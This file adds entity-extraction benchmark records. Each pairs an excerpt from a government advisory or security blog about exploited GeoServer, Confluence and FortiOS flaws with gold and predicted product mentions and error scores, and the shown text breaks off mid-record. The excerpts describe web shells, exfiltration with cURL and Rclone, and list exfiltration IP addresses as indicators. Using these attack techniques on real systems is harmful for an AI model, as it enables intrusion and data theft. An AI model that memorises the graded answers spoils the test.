@@ -1,0 +1,647 @@
+[
+  {
+    "sample_id": "aa25-266a_w3",
+    "input_text": "opy of IOCs, see:  AA25-266A-JSON.stix_.json  AA25-266A-STIX.stix_.xml TLP:CLEAR CISA Page 5 of 19 | Product ID: AA25-266A TLP:CLEAR Technical Details Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 17. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. Threat Actor Activity CISA responded to a suspected compromise of a large FCEB agency after the agency’s security operations center (SOC) observed multiple endpoint security alerts. During the incident response, CISA discovered that cyber threat actors gained access to the agency’s network on July 11, 2024, by exploiting GeoServer vulnerability CVE 2024-36401 [CWE-95: “Eval Injection”] on a public-facing GeoServer (GeoServer 1). This critical vulnerability, disclosed June 30, 2024, allows unauthenticated users to gain remote code execution (RCE) on affected GeoServer versions.0F1 The cyber threat actors used this vulnerability to download open source tools and scripts and establish persistence in the agency’s network. (CISA added this vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog on July 15, 2024.) After gaining initial access to GeoServer 1, the cyber threat actors gained separate initial access to a second GeoServer (GeoServer 2) on July 24, 2024, by exploiting the same vulnerability. They moved laterally from GeoServer 1 to a web server (Web Server) and then a Structured Query Language (SQL) server. On each server, they uploaded (or attempted to upload) web shells such as China Chopper, along with scripts designed for remote access, persistence, command execution, and privilege escalation. The cyber threat actors also used living off the land (LOTL) techniques. See Figure 1 for an overview of the cyber threat actors’ activity and the following sections for detailed threat actors TTPs. Figure 1. Overview of Threat Actor Activity TLP:CLEAR CISA Page 6 of 19 | Product ID: AA25-266A TLP:CLEAR Reconnaissance The cyber threat actors identified CVE-2024-36401 in the organization’s public-facing GeoServer using Burp Suite Burp Scanner [T1595.002]. CISA detected this scanning activity by analyzing web logs and identifying signatures associated with the tool. Specifically, CISA observed domains linked to Burp Collaborator—a component of Burp Suite used for vulnerability detection—originating from the same IP address the cyber threat actors later used to exploit the GeoServer vulnerability for initial access. Resource Development The cyber threat actors used publicly available tools to conduct their malicious operations. In one instance, they gained remote access to the organization’s network and leveraged a commercially available virtual private server (VPS) from a cloud infrastructure provider [T1583.003]. Initial Access To gain initial access to GeoServer 1 and GeoServer 2, the cyber threat actors exploited CVE 2024-36401 [T1190]. ",
+    "gold_output": {
+      "entities": [
+        {
+          "id": "E63",
+          "text": "GeoServer",
+          "type": "Configuration",
+          "start": 723,
+          "end": 732,
+          "normalized_id": "cpe:2.3:a:geoserver:geoserver:*:*:*:*:*:*:*:*",
+          "evidence": "GeoServer vulnerability CVE 2024-36401 [CWE-95: “Eval Injection”] on a public-facing GeoServer (GeoServer 1).",
+          "notes": "v4.5 human reannotation and adjudication"
+        },
+        {
+          "id": "E64",
+          "text": "GeoServer",
+          "type": "Configuration",
+          "start": 2906,
+          "end": 2915,
+          "normalized_id": "cpe:2.3:a:geoserver:geoserver:*:*:*:*:*:*:*:*",
+          "evidence": "GeoServer 1 and GeoServer 2, the cyber threat actors exploited CVE 2024-36401 [T1190].",
+          "notes": "v4.5 human reannotation and adjudication"
+        }
+      ]
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Web Server",
+          "type": "Configuration",
+          "start": 1478,
+          "end": 1488,
+          "normalized_id": null,
+          "id": "E4"
+        },
+        {
+          "text": "Burp Suite Burp Scanner",
+          "type": "Configuration",
+          "start": 2157,
+          "end": 2180,
+          "normalized_id": null,
+          "id": "E6"
+        },
+        {
+          "text": "Burp Collaborator",
+          "type": "Configuration",
+          "start": 2352,
+          "end": 2369,
+          "normalized_id": null,
+          "id": "E8"
+        },
+        {
+          "text": "VPS",
+          "type": "Configuration",
+          "start": 2810,
+          "end": 2813,
+          "normalized_id": null,
+          "id": "E9"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 4,
+      "strict_fn": 2,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- TLP = Traffic Light Protocol\n- FCEB = federal civilian executive branch\n- EDR = endpoint detection and response\n- IRP = incident response plan\n- CISA = Cybersecurity and Infrastructure Security Agency\n- TTPs = tactics, techniques, and procedures\n- IOCs = indicators of compromise\n- SOC = security operations center\n- GeoServer = GeoServer 1\n- RCE = remote code execution\n- KEV = Known Exploited Vulnerabilities\n- GeoServer = GeoServer 2\n- SQL = Structured Query Language\n- LOTL = living off the land\n- VPS = virtual private server\n- BITS = Background Intelligence Transfer Service\n- SSH = Secure Shell\n- FTP = File Transfer Protocol\n- BOD = Binding Operational Directive\n- SIEM = security information and event management\n- RHEL = Red Hat Enterprise Linux\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- CMDB = configuration management database"
+    },
+    "parent_candidate_id": "c_r1_p0_g0_para_0"
+  },
+  {
+    "sample_id": "aa23-289a_w0",
+    "input_text": " To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or SOC@cisecurity.org). This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp. TLP:CLEAR Product ID: AA23-289A October 16, 2023 Authored by: TLP:CLEAR Threat Actors Exploit Atlassian Confluence CVE-2023-22515 for Initial Access to Networks SUMMARY The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint Cybersecurity Advisory (CSA) in response to the active exploitation of CVE-2023-22515. This recently disclosed vulnerability affects certain versions of Atlassian Confluence Data Center and Server, enabling malicious cyber threat actors to obtain initial access to Confluence instances by creating unauthorized Confluence administrator accounts. Threat actors exploited CVE-2023-22515 as a zero- day to obtain access to victim systems and continue active exploitation post-patch. Atlassian has rated this vulnerability as critical; CISA, FBI, and MS-ISAC expect widespread, continued exploitation due to ease of exploitation. CISA, FBI, and MS-ISAC strongly encourage network administrators to immediately apply the upgrades provided by Atlassian. CISA, FBI, and MS-ISAC also encourage organizations to hunt for malicious activity on their networks using the detection signatures and indicators of compromise (IOCs) in this CSA. If a potential compromise is detected, organizations should apply the incident response recommendations. For additional information on upgrade instructions, a complete list of affected product versions, and IOCs, see Atlassian’s security advisory for CVE-2023-22515.[1] While Atlassian’s advisory provides interim measures to temporarily mitigate known attack vectors, CISA, FBI, and MS-ISAC strongly encourage upgrading to a fixed version or taking servers offline to apply necessary updates. ",
+    "gold_output": {
+      "entities": [
+        {
+          "id": "E1",
+          "text": "Atlassian Confluence",
+          "type": "Configuration",
+          "start": 1094,
+          "end": 1114,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*",
+          "evidence": "TLP:CLEAR Product ID: AA23-289A October 16, 2023 Authored by: TLP:CLEAR Threat Actors Exploit Atlassian Confluence CVE-2023-22515 for Initial Access to Networks SUMMARY The Cybersecurity and Infrastructure Security Agency (CISA), Fede"
+        },
+        {
+          "id": "E16",
+          "text": "Atlassian Confluence Data Center and Server",
+          "type": "Configuration",
+          "start": 1513,
+          "end": 1556,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*",
+          "evidence": "Atlassian Confluence Data Center and Server, enabling malicious cyber threat actors to obtain initial access to Confluence instances by creating unauthorized Confluence administrator accounts.",
+          "notes": "v4.5 human reannotation and adjudication"
+        }
+      ]
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Atlassian Confluence Data Center and Server",
+          "type": "Configuration",
+          "start": 1513,
+          "end": 1556,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence_data_center_and_server:*:*:*:*:*:*:*:*",
+          "id": "E3"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 1,
+      "strict_fp": 0,
+      "strict_fn": 1,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- CISA = Cybersecurity and Infrastructure Security Agency\n- FBI = Federal Bureau of Investigation\n- MS-ISAC = Multi-State Information Sharing and Analysis Center\n- CSA = Cybersecurity Advisory\n- IOCs = indicators of compromise\n- OWASP = Open Web Application Security Project\n- MFA = multifactor authentication\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- TTPs = tactics, techniques, and procedures\n- CSF = Cybersecurity Framework\n- CIS = Center for Internet Security’s"
+    },
+    "parent_candidate_id": "c_r1_p0_g0_para_0"
+  },
+  {
+    "sample_id": "aa25-266a_w11",
+    "input_text": "y Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.  Establish a vulnerability management plan that includes procedures for prioritization and emergency patching. o Prioritize patching of known exploited vulnerabilities listed in the KEV catalog. • CISA urges organizations to address KEV catalog vulnerabilities immediately. o Prioritize patching vulnerabilities in high-risk systems, including public facing systems as they are attractive targets for threat actors. TLP:CLEAR CISA Page 15 of 19 | Product ID: AA25-266A TLP:CLEAR o Ensure high-risk systems are identified and prioritized for rapid patching by implementing asset management practices and conducting an asset inventory. • Continuously discover and validate internet-facing assets through automated asset management and scanning (e.g., attack surface management tools, vulnerability scanners). • Consider using a configuration management database (CMDB) with discovery and vulnerability tools to enrich asset context and support automated prioritization. o Form a dedicated team responsible for assessing and implementing emergency patches, this team should include representatives from IT, security, and relevant business units.  Maintain, practice, and update cybersecurity IRPs [CPG 2.S, 5.A]. o Prepare a written IRP policy and IRP with senior leadership support. • The policy should identify purpose and objectives, what constitutes an incident, prioritization or severity ratings of incidents, clear escalation procedures, IR personnel, and plans for notification, interaction and information sharing with media, law enforcement, and partners. • The IRP should identify:  Key personnel with knowledge of the network  Key resources and courses of action (COAs) for containment and eradication in the event of compromise.  Procedures for granting third parties prompt access to networks and security tools. o This should include processes for expediating deployment of EDR and other security tools through change control boards (CCBs). • The IRP should include procedures for establishing out-of-band communications systems and accounts in case primary systems are compromised or not available (such as with ransomware incidents). • Periodically test the IRP under real-world conditions, such as via purple team engagements and tabletop exercises.  During the test, include engagement with third party incident responders and external EDR agents and other tools.  Following the test, update the IRP as necessary. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "National Institute of Standards and Technology",
+          "type": "Configuration",
+          "start": 53,
+          "end": 99,
+          "normalized_id": null,
+          "id": "E1"
+        },
+        {
+          "text": "CMDB",
+          "type": "Configuration",
+          "start": 1409,
+          "end": 1413,
+          "normalized_id": null,
+          "id": "E2"
+        },
+        {
+          "text": "IRPs",
+          "type": "Configuration",
+          "start": 1738,
+          "end": 1742,
+          "normalized_id": null,
+          "id": "E3"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 3,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- TLP = Traffic Light Protocol\n- FCEB = federal civilian executive branch\n- EDR = endpoint detection and response\n- IRP = incident response plan\n- CISA = Cybersecurity and Infrastructure Security Agency\n- TTPs = tactics, techniques, and procedures\n- IOCs = indicators of compromise\n- SOC = security operations center\n- GeoServer = GeoServer 1\n- RCE = remote code execution\n- KEV = Known Exploited Vulnerabilities\n- GeoServer = GeoServer 2\n- SQL = Structured Query Language\n- LOTL = living off the land\n- VPS = virtual private server\n- BITS = Background Intelligence Transfer Service\n- SSH = Secure Shell\n- FTP = File Transfer Protocol\n- BOD = Binding Operational Directive\n- SIEM = security information and event management\n- RHEL = Red Hat Enterprise Linux\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- CMDB = configuration management database"
+    },
+    "parent_candidate_id": "c_r1_p0_g0_para_0"
+  },
+  {
+    "sample_id": "aa25-266a_w7",
+    "input_text": "ccessfully establishing an outbound connection with their C2 server using HTTP over TCP/4441. On July 14, 2024, the cyber threat actors executed /tmp/mm.sh on the Web Server followed by an encoded command to execute Stowaway. The contents of this file could not be recovered. Additionally, they used Stowaway to establish a second C2 connection over TCP/50012, likely serving as a backup C2 channel. CISA discovered evidence of various files hosted on the C2 server, including numerous publicly available tools and scripts:  RingQ antivirus defense evasion tool (RingQ.exe, RingQ.rar)  IOX proxy tool (iox.rar)  BusyBox trojan multi-tool (busybox)  WinRAR archive tool (Rar.exe)  Stowaway proxy tool (agent, agent.tar, agent.zip, agentu.exe)  Web shells (Handx.ashx, start_tomcat.jsp)  Various shell scripts (mm.sh, t.py, t1.sh, c.bat) Detection The cyber threat actors remained undetected in the organization’s environment for three weeks before the organization’s SOC identified the compromise using their EDR tool. On July 31, 2024, their EDR tool identified a 1.txt file uploaded as suspected malware on the SQL Server. The SOC responded to additional alerts when the cyber threat actors transferred 1.txt to the SQL Server through bitsadmin after attempting other LOTL techniques, such as leveraging PowerShell and certutil. The alerts TLP:CLEAR CISA Page 10 of 19 | Product ID: AA25-266A TLP:CLEAR generated by this activity on the SQL server prompted the SOC to contain the server, initiate an investigation, request assistance from CISA, and uncover malicious activity on GeoServer 1. Lessons Learned CISA is sharing the following lessons learned based on what CISA learned about the organization’s security posture through incident detection and response activities. 1. Vulnerabilities were not promptly remediated. a. The cyber threat actors exploited CVE-2024-36401 for initial access on two GeoServers. b. The vulnerability was disclosed June 30, 2024, and the cyber threat actors exploited it for initial access to GeoServer 1 on July 11, 2024. c. The vulnerability was added to CISA’s KEV Catalog on July 15, 2024, and by July 24, 2024, the vulnerability was not patched when the cyber threat actors exploited it for access to GeoServer 2. i. Note: FCEB agencies are required to remediate vulnerabilities in CISA’s KEV Catalog within prescribed timeframes under Binding Operational Directive (BOD) 22-01. July 24, 2024, was within the KEV-required patching window for this CVE. However, CISA encourages FCEB agencies and critical infrastructure organizations to address KEV catalog vulnerabilities immediately as part of their vulnerability management plan. 2. The agency did not test or exercise their IRP, nor did their IRP enable them to promptly engage third parties and grant third parties’ access to necessary resources. a. On Aug. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Web Server",
+          "type": "Configuration",
+          "start": 163,
+          "end": 173,
+          "normalized_id": null,
+          "id": "E1"
+        },
+        {
+          "text": "GeoServers",
+          "type": "Configuration",
+          "start": 1910,
+          "end": 1920,
+          "normalized_id": null,
+          "id": "E3"
+        },
+        {
+          "text": "GeoServer 2",
+          "type": "Configuration",
+          "start": 2248,
+          "end": 2259,
+          "normalized_id": null,
+          "id": "E4"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 3,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- TLP = Traffic Light Protocol\n- FCEB = federal civilian executive branch\n- EDR = endpoint detection and response\n- IRP = incident response plan\n- CISA = Cybersecurity and Infrastructure Security Agency\n- TTPs = tactics, techniques, and procedures\n- IOCs = indicators of compromise\n- SOC = security operations center\n- GeoServer = GeoServer 1\n- RCE = remote code execution\n- KEV = Known Exploited Vulnerabilities\n- GeoServer = GeoServer 2\n- SQL = Structured Query Language\n- LOTL = living off the land\n- VPS = virtual private server\n- BITS = Background Intelligence Transfer Service\n- SSH = Secure Shell\n- FTP = File Transfer Protocol\n- BOD = Binding Operational Directive\n- SIEM = security information and event management\n- RHEL = Red Hat Enterprise Linux\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- CMDB = configuration management database"
+    },
+    "parent_candidate_id": "c_r1_p0_g0_para_0"
+  },
+  {
+    "sample_id": "aa25-266a_w8",
+    "input_text": "-required patching window for this CVE. However, CISA encourages FCEB agencies and critical infrastructure organizations to address KEV catalog vulnerabilities immediately as part of their vulnerability management plan. 2. The agency did not test or exercise their IRP, nor did their IRP enable them to promptly engage third parties and grant third parties’ access to necessary resources. a. On Aug. 1, 2024, upon discovering the endpoint alerts, the agency conducted remote triage of affected systems and used their EDR tool to contain the intrusion. i. After containment, the agency engaged CISA to investigate potential threat actor persistence in their environment. ii. Their IRP did not have procedures for bringing in third parties for assistance, which hampered CISA’s efforts to respond to the incident quickly and efficiently. (1) The agency could not provide CISA remote access to their security information and event management (SIEM) tool, which initially kept CISA from reviewing all available logs, hindering CISA’s analysis. (2) The agency had to go through their change control board process before CISA could deploy their EDR agents. (3) The agency could have proactively identified these roadblocks by testing their IRP, such as via a tabletop exercise, but had not tested their plan for a long period. TLP:CLEAR CISA Page 11 of 19 | Product ID: AA25-266A TLP:CLEAR 3. EDR alerts were not continuously reviewed, and some public-facing systems lacked endpoint protection. a. The activity remained undetected for three weeks; the agency missed an opportunity to detect this activity on July 15, 2024, as they did not observe an alert from GeoServer 1 where the EDR detected the Stowaway tool. b. The Web Server lacked endpoint protection. Indicators of Compromise See Table 1 for IOCs associated with this activity. Disclaimer: The IP addresses in this advisory were observed in August 2024, and some may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors. Table 1. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "GeoServer 1",
+          "type": "Configuration",
+          "start": 1655,
+          "end": 1666,
+          "normalized_id": null,
+          "id": "E1"
+        },
+        {
+          "text": "Web Server",
+          "type": "Configuration",
+          "start": 1716,
+          "end": 1726,
+          "normalized_id": null,
+          "id": "E2"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 2,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- TLP = Traffic Light Protocol\n- FCEB = federal civilian executive branch\n- EDR = endpoint detection and response\n- IRP = incident response plan\n- CISA = Cybersecurity and Infrastructure Security Agency\n- TTPs = tactics, techniques, and procedures\n- IOCs = indicators of compromise\n- SOC = security operations center\n- GeoServer = GeoServer 1\n- RCE = remote code execution\n- KEV = Known Exploited Vulnerabilities\n- GeoServer = GeoServer 2\n- SQL = Structured Query Language\n- LOTL = living off the land\n- VPS = virtual private server\n- BITS = Background Intelligence Transfer Service\n- SSH = Secure Shell\n- FTP = File Transfer Protocol\n- BOD = Binding Operational Directive\n- SIEM = security information and event management\n- RHEL = Red Hat Enterprise Linux\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- CMDB = configuration management database"
+    },
+    "parent_candidate_id": "c_r1_p0_g0_para_0"
+  },
+  {
+    "sample_id": "aa23-289a_w1",
+    "input_text": "endations. For additional information on upgrade instructions, a complete list of affected product versions, and IOCs, see Atlassian’s security advisory for CVE-2023-22515.[1] While Atlassian’s advisory provides interim measures to temporarily mitigate known attack vectors, CISA, FBI, and MS-ISAC strongly encourage upgrading to a fixed version or taking servers offline to apply necessary updates. For a downloadable copy of IOCs, see: • AA23-289A STIX XML • AA23-289A STIX JSON CISA  FBI | MS-ISAC TLP:CLEAR Page 2 of 6 | Product ID: AA23-289A TLP:CLEAR TECHNICAL DETAILS Overview CVE-2023-22515 is a critical Broken Access Control vulnerability affecting the following versions of Atlassian Confluence Data Center and Server. Note: Atlassian Cloud sites (sites accessed by an atlassian.net domain), including Confluence Data Center and Server versions before 8.0.0, are not affected by this vulnerability. • 8.0.0 • 8.0.1 • 8.0.2 • 8.0.3 • 8.0.4 • 8.1.0 • 8.1.1 • 8.1.3 • 8.1.4 • 8.2.0 • 8.2.1 • 8.2.2 • 8.2.3 • 8.3.0 • 8.3.1 • 8.3.2 • 8.4.0 • 8.4.1 • 8.4.2 • 8.5.0 • 8.5.1 Unauthenticated remote threat actors can exploit this vulnerability to create unauthorized Confluence administrator accounts and access Confluence instances. More specifically, threat actors can change the Confluence server’s configuration to indicate the setup is not complete and use the /setup/setupadministrator.action endpoint to create a new administrator user. The vulnerability is triggered via a request on the unauthenticated /server-info.action endpoint. Considering the root cause of the vulnerability allows threat actors to modify critical configuration settings, CISA, FBI, and MS-ISAC assess that the threat actors may not be limited to creating new administrator accounts. Open source further indicates an Open Web Application Security Project (OWASP) classification of injection (i.e., CWE-20: Improper Input Validation) is an appropriate description.[2] Atlassian released a patch on October 4, 2023, and confirmed that threat actors exploited CVE-2023-22515 as a zero-day—a previously unidentified vulnerability.[1] On October 5, 2023, CISA added this vulnerability to its Known Exploited Vulnerabilities Catalog based on evidence of active exploitation. Due to the ease of exploitation, CISA, FBI, and MS-ISAC expect to see widespread exploitation of unpatched Confluence instances in government and private networks. Post-Exploitation: Exfiltration of Data Post-exploitation exfiltration of data can be executed through of a variety of techniques. A predominant method observed involves the use of cURL—a command line tool used to transfer data to or from a server. An additional data exfiltration technique observed includes use of Rclone [S1040]—a command line tool used to sync data to cloud and file hosting services such as Amazon Web Services and China-based UCloud Information Technology Limited. ",
+    "gold_output": {
+      "entities": [
+        {
+          "id": "E17",
+          "text": "Atlassian Confluence Data Center and Server",
+          "type": "Configuration",
+          "start": 686,
+          "end": 729,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*",
+          "evidence": "Atlassian Confluence Data Center and Server.",
+          "notes": "v4.5 human reannotation and adjudication"
+        }
+      ]
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Atlassian Confluence Data Center and Server",
+          "type": "Configuration",
+          "start": 686,
+          "end": 729,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence_data_center_and_server:*:*:*:*:*:*:*:*",
+          "id": "E3"
+        },
+        {
+          "text": "Open Web Application Security Project",
+          "type": "Configuration",
+          "start": 1802,
+          "end": 1839,
+          "normalized_id": null,
+          "id": "E4"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 1,
+      "strict_fp": 1,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- CISA = Cybersecurity and Infrastructure Security Agency\n- FBI = Federal Bureau of Investigation\n- MS-ISAC = Multi-State Information Sharing and Analysis Center\n- CSA = Cybersecurity Advisory\n- IOCs = indicators of compromise\n- OWASP = Open Web Application Security Project\n- MFA = multifactor authentication\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- TTPs = tactics, techniques, and procedures\n- CSF = Cybersecurity Framework\n- CIS = Center for Internet Security’s"
+    },
+    "parent_candidate_id": "c_r1_p0_g0_para_0"
+  },
+  {
+    "sample_id": "aa23-289a_w2",
+    "input_text": "xecuted through of a variety of techniques. A predominant method observed involves the use of cURL—a command line tool used to transfer data to or from a server. An additional data exfiltration technique observed includes use of Rclone [S1040]—a command line tool used to sync data to cloud and file hosting services such as Amazon Web Services and China-based UCloud Information Technology Limited. Note: This does not preclude the effectiveness of alternate methods, but highlights methods observed to date. Threat actors were observed using Rclone to either upload a configuration file to victim infrastructure or enter CISA  FBI | MS-ISAC TLP:CLEAR Page 3 of 6 | Product ID: AA23-289A TLP:CLEAR cloud storage credentials via the command line. Example configuration file templates are listed in the following Figures 1 and 2, which are populated with the credentials of the exfiltration point: Figure 1 Figure 2 The following User-Agent strings were observed in request headers. Note: As additional threat actors begin to use this CVE due to the availability of publicly posted proof-of-concept code, an increasing variation in User-Agent strings is expected. • Python-requests/2.27.1 • curl/7.88.1 Indicators of Compromise Disclaimer: Organizations are recommended to investigate or vet these IP addresses prior to taking action, such as blocking. [s3] type = env_auth = access_key_id = secret_access_key = region = endpoint = location_constraint = acl = server_side_encryption = storage_class = [minio] type = provider = env_auth = access_key_id = secret_access_key = endpoint = acl = CISA  FBI | MS-ISAC TLP:CLEAR Page 4 of 6 | Product ID: AA23-289A TLP:CLEAR The following IP addresses were obtained from FBI investigations as of October 2023 and observed conducting data exfiltration: • 170.106.106[.]16 • 43.130.1[.]222 • 152.32.207[.]23 • 199.19.110[.]14 • 95.217.6[.]16 (Note: This is the official rclone.org website) Additional IP addresses observed sending related exploit traffic have been shared by Microsoft.[3] DETECTION METHODS Network defenders are encouraged to review and deploy Proofpoint’s Emerging Threat signatures. See Ruleset Update Summary - 2023/10/12 - v10438.[4] Network defenders are also encouraged to aggregate application and server-level logging from Confluence servers to a logically separated log search and alerting system, as well as configure alerts for signs of exploitation (as detailed in Atlassian’s security advisory). INCIDENT RESPONSE Organizations are encouraged to review all affected Confluence instances for evidence of compromise, as outlined by Atlassian.[1] If compromise is suspected or detected, organizations should assume that threat actors hold full administrative access and can perform any number of unfettered actions—these include but are not limited to exfiltration of content and system credentials, as well as installation of malicious plugins. If a potential compromise is detected, organizations should: 1. ",
+    "gold_output": {
+      "entities": []
+    },
+    "predicted_output": {
+      "entities": [
+        {
+          "text": "Confluence servers",
+          "type": "Configuration",
+          "start": 2289,
+          "end": 2307,
+          "normalized_id": "cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*",
+          "id": "E2"
+        }
+      ]
+    },
+    "error_details": {
+      "focus_entity_type": "Configuration",
+      "strict_tp": 0,
+      "strict_fp": 1,
+      "strict_fn": 0,
+      "boundary_overlap_pairs": 0,
+      "overlap_threshold": 0.5,
+      "source_split": "train",
+      "document_abbreviations": "- CISA = Cybersecurity and Infrastructure Security Agency\n- FBI = Federal Bureau of Investigation\n- MS-ISAC = Multi-State Information Sharing and Analysis Center\n- CSA = Cybersecurity Advisory\n- IOCs = indicators of compromise\n- OWASP = Open Web Application Security Project\n- MFA = multifactor authentication\n- CPGs = Cybersecurity Performance Goals\n- NIST = National Institute of Standards and Technology\n- TTPs = tactics, techniques, and procedures\n- CSF = Cybersecurity Framework\n- CIS = Center for Internet Security’s"
+    },
+    "parent_candidate_id": "c_r1_p0_g0_para_0"
+  },
+  {
+    "sample_id": "fortios-sslvpn-rapid7-fortinet-targeting_w0",
+    "input_text": "The following blog was co-authored by Caitlin Condon and Bob Rudis , also known (in his own words) as “some caveman from Maine.”\nLast week, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and the FBI published a joint alert to warn users that APT threat actors were likely exploiting unpatched Fortinet FortiOS devices to gain initial access to government, commercial, technology, and other organizations’ networks. The alert highlighted three FortiOS vulnerabilities, all of which were previously known, and at least one of which (CVE-2018-13379) has been broadly exploited for more than 18 months. This week, CISA published an additional alert amplifying a threat report from security firm Onapsis, which describes ongoing attacks against SAP applications .\nRapid7 has previously analyzed a number of the highest-severity vulnerabilities enumerated in this latest set of alerts. The CVEs included in these reports have been detailed below, along with recommendations for organizations seeking to defend themselves against ongoing exploitation. Notably, none of these vulnerabilities are new—many of them are a year or more old, which underscores the need for a regular patch cycle, as well as a defined patch cycle exception process.\nFortiOS vulnerabilities\nFortinet devices are what we call network pivots —that is, the position they occupy in organizations’ networks gives external attackers the ability to access internal networks if exploited successfully, which in turn allows for a range of secondary attacks and other nefarious activities. If at all possible, defenders should strongly consider implementing a “zero-day” patch cycle for internet-exposed and other network pivot products, including (but not only) Fortinet and other VPNs. InsightVM and Nexpose customers can assess their exposure to all three FortiOS CVEs below with vulnerability checks.\nCVE-2018-13379 is a pre-authentication information disclosure vulnerability that arises from a path traversal flaw in the web portal component of FortiOS SSL VPNs. The vulnerability allows external attackers to download FortiOS system files through specially crafted HTTP resource requests and has been exploited in the wild since 2019 . Read our full analysis of CVE-2018-13379 and its history here .\nCVE-2019-5591 is a default configuration vulnerability in FortiOS that allows an unauthenticated attacker on the same subnet to intercept sensitive information by impersonating the LDAP server.\nCVE-2020-12812 is an improper authentication vulnerability in SSL VPN in FortiOS 6.4.0, 6.2.0 to 6.2.3, 6.0.9 and below that gives a user the ability to log in successfully without being prompted for the second factor of authentication (FortiToken) if that user changes the case of their username.\n",
+    "gold_output": {
+      "entities": [
+        {
+          "id": "E18",
+          "text": "FortiOS",
+          "type": "Configuration",
+          "start": 1835,
+          "end": 1842,
+          "normalized_id": "cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*",
+          "notes": "FortiOS 的正式 CPE 使用 part=o；a:fortinet:fortios 在当前 NVD CPE 检索中无匹配。",
+          "evidence": "InsightVM and Nexpose customers can assess their exposure to all three FortiOS CVEs below with vulnerability checks.\n"
+        },
+        {
+          "id": "E19",
+          "text": "FortiOS",
+          "type": "Configuration",
+          "start": 2341,
+          "end": 2348,
+          "normalized_id": "cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*",
+          "notes": "FortiOS 的正式 CPE 使用 part=o；a:fortinet:fortios 在当前 NVD CPE 检索中无匹配。",
+          "evidence": "CVE-2019-5591 is a default configuration vulnerability in FortiOS that allows an unauthenticated attacker on the same subnet to intercept sensitive information by impersonating the LDAP"
+        },
+        {
+          "id": "E20",
+          "text": "FortiOS",
+          "type": "Configuration",
+          "start": 2550,
+          "end": 2557,
+          "normalized_id": "cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*",
